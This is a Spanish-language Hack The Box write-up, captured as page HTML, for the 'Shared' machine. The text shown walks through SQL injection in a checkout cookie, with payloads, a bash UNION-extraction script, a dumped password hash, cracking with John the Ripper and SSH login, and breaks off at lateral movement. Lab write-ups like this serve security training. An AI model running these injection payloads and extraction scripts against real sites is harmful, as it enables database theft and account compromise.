0-3.9-.788t-3.175-2.137T2.788 15.9T2 12t.788-3.9t2.137-3.175T8.1 2.788T12 2t3.9.788t3.175 2.137T21.213 8.1T22 12t-.788 3.9t-2.137 3.175t-3.175 2.138T12 22m0-2q3.325 0 5.663-2.337T20 12t-2.337-5.663T12 4T6.337 6.338T4 12t2.338 5.663T12 20" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:schedule-outline-rounded></use></svg></div><div class=text-sm>9 minutes</div></div></div><div class="relative onload-animation"><div class="transition font-bold before:absolute before:bg-[var(--primary)] before:rounded-md before:h-5 before:left-[-1.125rem] before:top-[0.75rem] block dark:text-white/90 mb-3 md:before:w-1 md:text-[2.5rem]/[2.75rem] text-3xl text-black/90 w-full" data-pagefind-body data-pagefind-meta=title data-pagefind-weight=10>Shared HTB Writeup</div></div><div class=onload-animation><div class="flex items-center gap-4 dark:text-neutral-400 flex-wrap gap-x-4 gap-y-2 mb-5 text-neutral-500" data-astro-cid-qtyrxm4s><div class="flex items-center" data-astro-cid-qtyrxm4s><div class=meta-icon data-astro-cid-qtyrxm4s><svg data-icon=material-symbols:calendar-today-outline-rounded height=1em viewBox="0 0 24 24" width=1em class=text-xl data-astro-cid-qtyrxm4s><symbol id=ai:material-symbols:calendar-today-outline-rounded><path d="M5 22q-.825 0-1.412-.587T3 20V6q0-.825.588-1.412T5 4h1V3q0-.425.288-.712T7 2t.713.288T8 3v1h8V3q0-.425.288-.712T17 2t.713.288T18 3v1h1q.825 0 1.413.588T21 6v14q0 .825-.587 1.413T19 22zm0-2h14V10H5zM5 8h14V6H5zm0 0V6z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:calendar-today-outline-rounded></use></svg></div><span class="text-sm text-50 font-medium" data-astro-cid-qtyrxm4s>2024-06-01</span></div><div class="flex items-center" data-astro-cid-qtyrxm4s><div class=meta-icon data-astro-cid-qtyrxm4s><svg data-icon=material-symbols:menu-rounded height=1em viewBox="0 0 24 24" width=1em class=text-xl data-astro-cid-qtyrxm4s><symbol id=ai:material-symbols:menu-rounded><path d="M4 18q-.425 0-.712-.288T3 17t.288-.712T4 16h16q.425 0 .713.288T21 17t-.288.713T20 18zm0-5q-.425 0-.712-.288T3 12t.288-.712T4 11h16q.425 0 .713.288T21 12t-.288.713T20 13zm0-5q-.425 0-.712-.288T3 7t.288-.712T4 6h16q.425 0 .713.288T21 7t-.288.713T20 8z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:menu-rounded></use></svg></div><div class="flex items-center flex-row flex-nowrap" data-astro-cid-qtyrxm4s><a href=/archive/category/HackTheBox/ class="transition whitespace-nowrap font-medium dark:hover:text-[var(--primary)] hover:text-[var(--primary)] link-lg text-50 text-sm" aria-label="View all posts in the HackTheBox category" data-astro-cid-qtyrxm4s>HackTheBox</a></div></div><div class="flex items-center" data-astro-cid-qtyrxm4s><div class=meta-icon data-astro-cid-qtyrxm4s><svg data-icon=material-symbols:tag-rounded height=1em viewBox="0 0 24 24" width=1em class=text-xl data-astro-cid-qtyrxm4s><symbol id=ai:material-symbols:tag-rounded><path d="m9 16l-.825 3.275q-.075.325-.325.525t-.6.2q-.475 0-.775-.375T6.3 18.8L7 16H4.275q-.5 0-.8-.387T3.3 14.75q.075-.35.35-.55t.625-.2H7.5l1-4H5.775q-.5 0-.8-.387T4.8 8.75q.075-.35.35-.55t.625-.2H9l.825-3.275Q9.9 4.4 10.15 4.2t.6-.2q.475 0 .775.375t.175.825L11 8h4l.825-3.275q.075-.325.325-.525t.6-.2q.475 0 .775.375t.175.825L17 8h2.725q.5 0 .8.387t.175.863q-.075.35-.35.55t-.625.2H16.5l-1 4h2.725q.5 0 .8.388t.175.862q-.075.35-.35.55t-.625.2H15l-.825 3.275q-.075.325-.325.525t-.6.2q-.475 0-.775-.375T12.3 18.8L13 16zm.5-2h4l1-4h-4z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:tag-rounded></use></svg></div><div class="flex items-center flex-row flex-nowrap" data-astro-cid-qtyrxm4s><div class="text-sm mx-1.5 text-[var(--meta-divider)] hidden" data-astro-cid-qtyrxm4s>/</div><a href=/archive/tag/Linux/ class="transition whitespace-nowrap font-medium dark:hover:text-[var(--primary)] hover:text-[var(--primary)] link-lg text-50 text-sm" aria-label="View all posts with the Linux tag" data-astro-cid-qtyrxm4s>Linux</a><div class="text-sm mx-1.5 text-[var(--meta-divider)]" data-astro-cid-qtyrxm4s>/</div><a href=/archive/tag/Medium/ class="transition whitespace-nowrap font-medium dark:hover:text-[var(--primary)] hover:text-[var(--primary)] link-lg text-50 text-sm" aria-label="View all posts with the Medium tag" data-astro-cid-qtyrxm4s>Medium</a></div></div></div></div><div class="overflow-hidden relative rounded-xl banner-container mb-8 onload-animation"><div class="transition absolute pointer-events-none bg-opacity-50 dark:bg-black/10 inset-0"></div><img alt="" class="w-full h-full object-cover" decoding=async height=375 loading=lazy src=/_astro/featured.DwV1Fz6M_Znf8ym.webp style=object-position:center width=666></div><div class="onload-animation custom-md dark:prose-invert markdown-content max-w-none mb-6 prose prose-base" data-pagefind-body><p>Shared es una máquina Linux mediana creada por Nauten en Hack The Box que presenta un sitio web con un nombre de host virtual que es vulnerable a la inyección SQL. La explotación exitosa de esta vulnerabilidad nos proporciona la contraseña de un usuario llamado james_mason. Con estas credenciales somos capaces de iniciar sesión a través de SSH y elevar privilegios a un usuario llamado dan_smith explotando un cron job que utiliza una versión de ipython que es vulnerable a CVE-2022-21699. A continuación, aplicamos ingeniería inversa a un ejecutable utilizando análisis estáticos y dinámicos para recuperar la contraseña del servicio local Redis. El proceso Redis se ejecuta como root, por lo que cargamos un módulo especial de objetos compartidos utilizando LOAD MODULE para ejecutar comandos como root.</p><h2 id=initial-recon><span style=color:#33acff>Initial Recon</span><a href=#initial-recon class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><p>Primero configuremos nuestro entorno y ejecutemos un escaneo de puertos TCP con esta envoltura nmap personalizada.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># Mhil4ne@Kali</span></span>
<span class=line><span style=color:#f97583>export</span><span style=color:#e1e4e8> rhost</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"10.10.10.x"</span></span>
<span class=line><span style=color:#b392f0>sudo</span><span style=color:#9ecbff> nmap</span><span style=color:#79b8ff> -sS</span><span style=color:#79b8ff> -p-</span><span style=color:#79b8ff> --open</span><span style=color:#79b8ff> --min-rate</span><span style=color:#79b8ff> 3000</span><span style=color:#79b8ff> -n</span><span style=color:#79b8ff> -Pn</span><span style=color:#79b8ff> -vvv</span><span style=color:#e1e4e8>  $rhost </span><span style=color:#79b8ff>-oG</span><span style=color:#9ecbff> nmap</span></span>
<span class=line></span></code></pre><p>El análisis informa de que los servicios SSH, HTTP y HTTPS se ejecutan en los puertos 22, 80 y 443 respectivamente.</p><h2 id=web-recon><span style=color:#33acff>Web Recon</span><a href=#web-recon class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><p>Al visitar el puerto 80, se nos redirige a shared.htb. Añadamos este nombre de host a nuestro archivo /etc/hosts{:.filepath} con la dirección IP correspondiente.</p><p>Ahora visitaremos <a href=https://shared.htb/ >https://shared.htb/</a> en una sesión de navegador proxy a través del proxy HTTP BurpSuite.</p><p>Página de índice Página de índice de la web shared.htb</p><h3 id=walking-the-application>Walking the Application<a href=#walking-the-application class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>Al explorar el contenido del sitio web, descubrimos la página de pago en /index.php?controller=cart&#x26;action=show. Cuando pasamos el ratón por encima del botón de pago, podemos ver que nos enviará a <a href=https://checkout.shared.htb>https://checkout.shared.htb</a>. Añadamos este nombre de host virtual a nuestro archivo /etc/hosts{:.filepath} para poder ver su contenido.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>sudo</span><span style=color:#9ecbff> sed</span><span style=color:#79b8ff> -E</span><span style=color:#79b8ff> -i</span><span style=color:#9ecbff> 's/(shared.htb).*/\1 checkout.\1/'</span><span style=color:#9ecbff> /etc/hosts</span></span>
<span class=line></span></code></pre><p>Ahora, cuando añadamos un artículo a nuestro carrito y naveguemos a /index.php?controller=cart&#x26;action=show, haremos clic en el botón de pago para ser redirigidos al sitio de pago.</p><h3 id=investigación-de-la-funcionalidad>Investigación de la funcionalidad<a href=#investigación-de-la-funcionalidad class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>Es interesante cómo este sitio es capaz de determinar qué artículo teníamos en nuestro carrito teniendo en cuenta que no proporcionamos ningún parámetro HTTP GET o POST. Vamos a investigar.</p><p>Observando la solicitud inicial que enviamos al sitio de pago en el mapa del sitio de BurpSuite, podemos ver que nuestra solicitud contiene una cookie inusual llamada custom_cart. El valor de esta cookie se puede descifrar automáticamente resaltándolo, revelando un objeto JSON con el código de producto y la cantidad del artículo de pago.</p><p>Encontramos una misteriosa cookie en BurpSuite</p><p>Podemos deducir que el sitio utiliza el código de producto suministrado en custom_cart para encontrar el precio del artículo, ya que no suministramos el precio, sino sólo el código de producto. Es probable que esta actividad sea gestionada por algún tipo de solución de base de datos, como un servidor SQL. Teniendo esto en cuenta, podemos comprobar si esta funcionalidad es vulnerable a la inyección SQL.</p><h3 id=descubrimiento-de-vulnerabilidades>Descubrimiento de vulnerabilidades<a href=#descubrimiento-de-vulnerabilidades class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>Introduzcamos algunas cargas útiles básicas de inyección SQL en la cookie de la pestaña de repetición de BurpSuite para ver si es posible la inyección SQL.</p><p>Respuesta del servidor a una carga útil de inyección SQL común</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#e1e4e8>{</span><span style=color:#b392f0>"CRAAFTKP'#"</span><span style=color:#79b8ff>:</span><span style=color:#b392f0>"1"</span><span style=color:#b392f0>}</span></span>
<span class=line></span></code></pre><p>La respuesta a la primera carga útil sugiere que la inyección SQL es posible, pero podemos asegurarnos enviando una carga útil que debería evaluarse como falsa, y otra que debería ser verdadera.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d>#!/usr/bin/env python3</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>from</span><span style=color:#9ecbff> urllib.parse</span><span style=color:#9ecbff> import</span><span style=color:#9ecbff> quote</span></span>
<span class=line><span style=color:#b392f0>from</span><span style=color:#9ecbff> sys</span><span style=color:#9ecbff> import</span><span style=color:#9ecbff> argv</span></span>
<span class=line></span>
<span class=line><span style=color:#f97583>if</span><span style=color:#b392f0> len(argv</span><span style=color:#e1e4e8>) == 2:</span></span>
<span class=line><span style=color:#b392f0>        sqli</span><span style=color:#9ecbff> =</span><span style=color:#9ecbff> argv[1]</span></span>
<span class=line><span style=color:#b392f0>        sqli</span><span style=color:#9ecbff> =</span><span style=color:#9ecbff> sqli.replace</span><span style=color:#e1e4e8>(</span><span style=color:#b392f0>'\\'</span><span style=color:#b392f0>,</span><span style=color:#9ecbff> '\\\\'</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#b392f0>        sqli</span><span style=color:#9ecbff> =</span><span style=color:#9ecbff> sqli.replace</span><span style=color:#e1e4e8>(</span><span style=color:#b392f0>'"'</span><span style=color:#b392f0>,</span><span style=color:#b392f0>'\\"'</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#79b8ff>        print</span><span style=color:#e1e4e8>(</span><span style=color:#9ecbff>quote</span><span style=color:#e1e4e8>(</span><span style=color:#b392f0>'{"'</span><span style=color:#9ecbff> +</span><span style=color:#9ecbff> argv[1]</span><span style=color:#9ecbff> +</span><span style=color:#9ecbff> '":"1"}'</span><span style=color:#e1e4e8>))</span></span>
<span class=line></span></code></pre><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>chmod</span><span style=color:#9ecbff> +x</span><span style=color:#9ecbff> makepayload.py</span></span>
<span class=line><span style=color:#e1e4e8>true</span><span style=color:#f97583>=</span><span style=color:#e1e4e8>$(</span><span style=color:#b392f0>./makepayload.py</span><span style=color:#9ecbff> "' OR 1=1#"</span><span style=color:#e1e4e8>) </span><span style=color:#6a737d># Always resolves to true</span></span>
<span class=line><span style=color:#e1e4e8>false</span><span style=color:#f97583>=</span><span style=color:#e1e4e8>$(</span><span style=color:#b392f0>./makepayload.py</span><span style=color:#9ecbff> "' AND 1=2#"</span><span style=color:#e1e4e8>) </span><span style=color:#6a737d># Always resolves to false</span></span>
<span class=line></span>
<span class=line><span style=color:#e1e4e8>url</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"https://checkout.shared.htb"</span></span>
<span class=line><span style=color:#b392f0>curl</span><span style=color:#79b8ff> -k</span><span style=color:#79b8ff> -s</span><span style=color:#e1e4e8> $url </span><span style=color:#79b8ff>-b</span><span style=color:#9ecbff> "custom_cart=</span><span style=color:#e1e4e8>$true</span><span style=color:#9ecbff>"</span><span style=color:#f97583> |</span><span style=color:#b392f0> sed</span><span style=color:#9ecbff> 's/^ *//'</span><span style=color:#f97583> ></span><span style=color:#79b8ff> true</span><span style=color:#9ecbff>.html</span></span>
<span class=line><span style=color:#b392f0>curl</span><span style=color:#79b8ff> -k</span><span style=color:#79b8ff> -s</span><span style=color:#e1e4e8> $url </span><span style=color:#79b8ff>-b</span><span style=color:#9ecbff> "custom_cart=</span><span style=color:#e1e4e8>$false</span><span style=color:#9ecbff>"</span><span style=color:#f97583> |</span><span style=color:#b392f0> sed</span><span style=color:#9ecbff> 's/^ *//'</span><span style=color:#f97583> ></span><span style=color:#79b8ff> false</span><span style=color:#9ecbff>.html</span></span>
<span class=line></span></code></pre><p>Esto debería dejarte con dos archivos llamados false.html{:.filepath} y true.html{:.filepath}. Para encontrar la diferencia entre los dos cuerpos de respuesta podemos usar diff.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>diff</span><span style=color:#79b8ff> false</span><span style=color:#9ecbff>.html</span><span style=color:#79b8ff> true</span><span style=color:#9ecbff>.html</span></span>
<span class=line></span></code></pre><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>37,39c37,39</span></span>
<span class=line><span style=color:#f97583>&#x3C;</span><span style=color:#f97583> &#x3C;</span><span style=color:#e1e4e8>td</span><span style=color:#f97583>></span><span style=color:#e1e4e8>Not Found</span><span style=color:#f97583>&#x3C;</span><span style=color:#e1e4e8>/td</span><span style=color:#f97583>></span></span>
<span class=line><span style=color:#f97583>&#x3C;</span><span style=color:#f97583> &#x3C;</span><span style=color:#e1e4e8>td</span><span style=color:#f97583>></span><span style=color:#e1e4e8>0</span><span style=color:#f97583>&#x3C;</span><span style=color:#e1e4e8>/td</span><span style=color:#f97583>></span></span>
<span class=line><span style=color:#f97583>&#x3C;</span><span style=color:#f97583> &#x3C;</span><span style=color:#e1e4e8>td</span><span style=color:#f97583>></span><span style=color:#ffab70>$0</span><span style=color:#e1e4e8>,</span><span style=color:#f97583>00&#x3C;</span><span style=color:#e1e4e8>/td</span><span style=color:#f97583>></span></span>
<span class=line><span style=color:#b392f0>---</span></span>
<span class=line><span style=color:#f97583>></span><span style=color:#f97583> &#x3C;</span><span style=color:#e1e4e8>td</span><span style=color:#f97583>></span><span style=color:#e1e4e8>53GG2EF</span><span style=color:#f97583>8&#x3C;</span><span style=color:#e1e4e8>/td</span><span style=color:#f97583>></span></span>
<span class=line><span style=color:#f97583>></span><span style=color:#f97583> &#x3C;</span><span style=color:#e1e4e8>td</span><span style=color:#f97583>></span><span style=color:#e1e4e8>1</span><span style=color:#f97583>&#x3C;</span><span style=color:#e1e4e8>/td</span><span style=color:#f97583>></span></span>
<span class=line><span style=color:#f97583>></span><span style=color:#f97583> &#x3C;</span><span style=color:#e1e4e8>td</span><span style=color:#f97583>></span><span style=color:#e1e4e8>$23,</span><span style=color:#f97583>90&#x3C;</span><span style=color:#e1e4e8>/td</span><span style=color:#f97583>></span></span>
<span class=line><span style=color:#b392f0>45c45</span></span>
<span class=line><span style=color:#f97583>&#x3C;</span><span style=color:#f97583> &#x3C;</span><span style=color:#e1e4e8>th scope</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"col"</span><span style=color:#f97583>></span><span style=color:#ffab70>$0</span><span style=color:#9ecbff>,00</span><span style=color:#f97583>&#x3C;</span><span style=color:#9ecbff>/th</span><span style=color:#f97583>></span></span>
<span class=line><span style=color:#b392f0>---</span></span>
<span class=line><span style=color:#f97583>></span><span style=color:#f97583> &#x3C;</span><span style=color:#e1e4e8>th scope</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"col"</span><span style=color:#f97583>></span><span style=color:#e1e4e8>$23</span><span style=color:#9ecbff>,90</span><span style=color:#f97583>&#x3C;</span><span style=color:#9ecbff>/th</span><span style=color:#f97583>></span></span>
<span class=line></span></code></pre><p>La consulta falsa devuelve «No encontrado» y valores cero para la cantidad y el precio, mientras que la consulta verdadera devuelve una entrada de producto. Esto es definitivamente suficiente evidencia de una vulnerabilidad de inyección SQL para comenzar la explotación.</p><h2 id=web-exploitation><span style=color:#33acff>Web Exploitation</span><a href=#web-exploitation class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><p>Ya hemos determinado que la inyección SQL ciega basada en booleanos es posible con las consultas true y false, pero hay muchas posibilidades de que podamos utilizar las consultas UNION SELECT para filtrar valores de la base de datos sin tener que utilizar un canal secundario.</p><h3 id=union-query-exfiltration>Union Query Exfiltration<a href=#union-query-exfiltration class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>Primero vamos a averiguar el número de columnas de la consulta original para poder compararlo con nuestra extensión UNION SELECT.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#e1e4e8>payload</span><span style=color:#f97583>=</span><span style=color:#e1e4e8>$(</span><span style=color:#b392f0>./makepayload.py</span><span style=color:#9ecbff> "' UNION SELECT 'c0lumn1','c0lumn2','c0lumn3'#"</span><span style=color:#e1e4e8>)</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>curl</span><span style=color:#79b8ff> -k</span><span style=color:#79b8ff> -s</span><span style=color:#9ecbff> "https://checkout.shared.htb"</span><span style=color:#79b8ff> -b</span><span style=color:#9ecbff> "custom_cart=</span><span style=color:#e1e4e8>$payload</span><span style=color:#9ecbff>"</span><span style=color:#f97583> |</span><span style=color:#79b8ff> \</span></span>
<span class=line><span style=color:#b392f0>	sed</span><span style=color:#9ecbff> 's/^ *//'</span><span style=color:#f97583> |</span></span>
<span class=line><span style=color:#b392f0>	egrep</span><span style=color:#9ecbff> '&#x3C;/?td>'</span></span>
<span class=line></span></code></pre><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>&#x3C;</span><span style=color:#e1e4e8>td</span><span style=color:#f97583>></span><span style=color:#e1e4e8>c0lumn</span><span style=color:#f97583>2&#x3C;</span><span style=color:#e1e4e8>/td</span><span style=color:#f97583>></span></span>
<span class=line><span style=color:#f97583>&#x3C;</span><span style=color:#e1e4e8>td</span><span style=color:#f97583>></span><span style=color:#e1e4e8>1</span><span style=color:#f97583>&#x3C;</span><span style=color:#e1e4e8>/td</span><span style=color:#f97583>></span></span>
<span class=line><span style=color:#f97583>&#x3C;</span><span style=color:#e1e4e8>td</span><span style=color:#f97583>></span><span style=color:#e1e4e8>$</span><span style=color:#f97583>&#x3C;</span><span style=color:#e1e4e8>/td</span><span style=color:#f97583>></span></span>
<span class=line></span></code></pre><p>Observa cómo la respuesta contiene el valor que enviamos en la segunda columna. Esto significa que podemos extraer datos a través de la segunda columna. Ahora vamos a crear un script para obtener cualquier valor en bruto de la base de datos.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d>#!/bin/bash</span></span>
<span class=line></span>
<span class=line><span style=color:#e1e4e8>[ </span><span style=color:#f97583>-z</span><span style=color:#9ecbff> "</span><span style=color:#e1e4e8>$SELECT</span><span style=color:#9ecbff>"</span><span style=color:#e1e4e8> ] &#x26;&#x26; </span><span style=color:#79b8ff>echo</span><span style=color:#9ecbff> "SELECT=* FROM=* WHERE=* </span><span style=color:#79b8ff>$0</span><span style=color:#9ecbff>"</span><span style=color:#e1e4e8> &#x26;&#x26; </span><span style=color:#79b8ff>exit</span></span>
<span class=line></span>
<span class=line><span style=color:#e1e4e8>payload</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"' UNION SELECT '',</span><span style=color:#e1e4e8>$SELECT</span><span style=color:#9ecbff>,''"</span></span>
<span class=line></span>
<span class=line><span style=color:#e1e4e8>[ </span><span style=color:#f97583>-z</span><span style=color:#9ecbff> "</span><span style=color:#e1e4e8>$FROM</span><span style=color:#9ecbff>"</span><span style=color:#e1e4e8> ] </span><span style=color:#f97583>||</span><span style=color:#e1e4e8> payload</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"</span><span style=color:#e1e4e8>$payload</span><span style=color:#9ecbff> FROM </span><span style=color:#e1e4e8>$FROM</span><span style=color:#9ecbff>"</span></span>
<span class=line><span style=color:#e1e4e8>[ </span><span style=color:#f97583>-z</span><span style=color:#9ecbff> "</span><span style=color:#e1e4e8>$WHERE</span><span style=color:#9ecbff>"</span><span style=color:#e1e4e8> ] </span><span style=color:#f97583>||</span><span style=color:#e1e4e8> payload</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"</span><span style=color:#e1e4e8>$payload</span><span style=color:#9ecbff> WHERE </span><span style=color:#e1e4e8>$WHERE</span><span style=color:#9ecbff>"</span><span style=color:#e1e4e8> </span></span>
<span class=line></span>
<span class=line><span style=color:#79b8ff>echo</span><span style=color:#e1e4e8> $payload</span></span>
<span class=line></span>
<span class=line><span style=color:#e1e4e8>payload</span><span style=color:#f97583>=</span><span style=color:#e1e4e8>$(</span><span style=color:#b392f0>./makepayload.py</span><span style=color:#9ecbff> "</span><span style=color:#e1e4e8>$payload</span><span style=color:#9ecbff>#"</span><span style=color:#e1e4e8>)</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>curl</span><span style=color:#79b8ff> -k</span><span style=color:#79b8ff> -s</span><span style=color:#9ecbff> "https://checkout.shared.htb"</span><span style=color:#79b8ff> -b</span><span style=color:#9ecbff> "custom_cart=</span><span style=color:#e1e4e8>$payload</span><span style=color:#9ecbff>"</span><span style=color:#f97583> |</span></span>
<span class=line><span style=color:#b392f0>	egrep</span><span style=color:#9ecbff> '&#x3C;/?td>'</span><span style=color:#f97583> |</span></span>
<span class=line><span style=color:#b392f0>	head</span><span style=color:#79b8ff> -1</span><span style=color:#f97583> |</span></span>
<span class=line><span style=color:#b392f0>	sed</span><span style=color:#79b8ff> -E</span><span style=color:#9ecbff> 's/^ *&#x3C;td>(.*)&#x3C;\/td>$/\1/'</span></span>
<span class=line></span></code></pre><p>Entonces podemos ver si podemos obtener los nombres de las bases de datos disponibles. Recuerde que esta base de datos es probablemente MySQL porque el # comentario está funcionando.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>chmod</span><span style=color:#9ecbff> +x</span><span style=color:#9ecbff> sqli.sh</span></span>
<span class=line><span style=color:#e1e4e8>SELECT</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"group_concat(schema_name)"</span><span style=color:#b392f0>   \</span></span>
<span class=line><span style=color:#e1e4e8>FROM=</span><span style=color:#9ecbff>"information_schema.schemata"</span><span style=color:#79b8ff>   \</span></span>
<span class=line><span style=color:#9ecbff>	./sqli.sh</span></span>
<span class=line></span></code></pre><pre class="astro-code github-dark" data-language=plaintext style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span>information_schema,checkout</span></span>
<span class=line><span></span></span></code></pre><p>Hay una base de datos llamada checkout que deberíamos explorar. Busquemos los nombres de sus tablas.</p><pre class="astro-code github-dark" data-language=sql style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>SELECT=</span><span style=color:#9ecbff>"group_concat(table_name)"</span><span style=color:#e1e4e8>   \</span></span>
<span class=line><span style=color:#f97583>FROM=</span><span style=color:#9ecbff>"information_schema.tables"</span><span style=color:#e1e4e8>    \</span></span>
<span class=line><span style=color:#f97583>WHERE=</span><span style=color:#9ecbff>"table_schema='checkout'"</span><span style=color:#e1e4e8>     \</span></span>
<span class=line><span style=color:#e1e4e8>	.</span><span style=color:#f97583>/</span><span style=color:#79b8ff>sqli</span><span style=color:#e1e4e8>.</span><span style=color:#79b8ff>sh</span></span>
<span class=line></span>
<span class=line></span></code></pre><pre class="astro-code github-dark" data-language=plaintext style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span>user,product</span></span>
<span class=line><span></span></span></code></pre><p>La tabla de usuarios parece interesante. Busquemos los nombres de las columnas y volquemos el contenido de la tabla.</p><pre class="astro-code github-dark" data-language=sql style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>SELECT=</span><span style=color:#9ecbff>"group_concat(column_name)"</span><span style=color:#e1e4e8>   \</span></span>
<span class=line><span style=color:#f97583>FROM=</span><span style=color:#9ecbff>"information_schema.columns"</span><span style=color:#e1e4e8>    \</span></span>
<span class=line><span style=color:#f97583>WHERE=</span><span style=color:#9ecbff>"table_name='user'"</span><span style=color:#e1e4e8>            \</span></span>
<span class=line><span style=color:#e1e4e8>	.</span><span style=color:#f97583>/</span><span style=color:#79b8ff>sqli</span><span style=color:#e1e4e8>.</span><span style=color:#79b8ff>sh</span></span>
<span class=line></span></code></pre><pre class="astro-code github-dark" data-language=sql style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#e1e4e8>id,username,</span><span style=color:#f97583>password</span></span>
<span class=line></span></code></pre><pre class="astro-code github-dark" data-language=sql style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>SELECT=</span><span style=color:#9ecbff>"group_concat(concat(id,0x7c,username,0x7c,password))"</span><span style=color:#e1e4e8> \</span></span>
<span class=line><span style=color:#f97583>FROM=</span><span style=color:#9ecbff>"checkout.user"</span><span style=color:#e1e4e8> \</span></span>
<span class=line><span style=color:#e1e4e8>	.</span><span style=color:#f97583>/</span><span style=color:#79b8ff>sqli</span><span style=color:#e1e4e8>.</span><span style=color:#79b8ff>sh</span></span>
<span class=line></span></code></pre><pre class="astro-code github-dark" data-language=plaintext style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span>1|james_mason|[REDACTED]</span></span>
<span class=line><span></span></span></code></pre><p>Sólo hay un resultado, pero tenemos lo que parece un hash MD5 en la columna de contraseña para el usuario james_mason.</p><h3 id=shell-as-james_mason>Shell as james_mason<a href=#shell-as-james_mason class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>ntentemos descifrar el hash usando a John the Ripper</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># mhil4ne@kali</span></span>
<span class=line><span style=color:#e1e4e8>hash</span><span style=color:#f97583>=</span><span style=color:#9ecbff>""</span><span style=color:#6a737d> # Hash here</span></span>
<span class=line><span style=color:#79b8ff>echo</span><span style=color:#9ecbff> "james_mason:</span><span style=color:#e1e4e8>$hash</span><span style=color:#9ecbff>"</span><span style=color:#f97583> ></span><span style=color:#9ecbff> md5.john</span></span>
<span class=line><span style=color:#b392f0>john</span><span style=color:#9ecbff> md5.john</span><span style=color:#79b8ff> \</span></span>
<span class=line><span style=color:#79b8ff>	--format=</span><span style=color:#9ecbff>"raw-md5"</span><span style=color:#79b8ff> \</span></span>
<span class=line><span style=color:#79b8ff>	--wordlist=</span><span style=color:#9ecbff>"rockyou.txt"</span><span style=color:#6a737d> # classic rockyou.txt wordlist</span></span>
<span class=line></span></code></pre><p>Usando estas credenciales en el servidor SSH del objetivo obtendremos un shell como james_mason.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># mhil4ne@kali</span></span>
<span class=line><span style=color:#b392f0>ssh</span><span style=color:#9ecbff> "james_mason@</span><span style=color:#e1e4e8>$rhost</span><span style=color:#9ecbff>"</span></span>
<span class=line></span></code></pre><p>No hay ninguna bandera de usuario en nuestro directorio de inicio, por lo que puede que tengamos que hacer algún movimiento lateral.</p><h3 id=lateral-movement>Lateral Movement<a href=#lateral-movement class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>Usaremos LinPEAS de PEASS-ng para buscar cualquier información útil en la máquina. También usaremos pspy para husmear en los procesos.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># mhil4ne@kali</span></span>
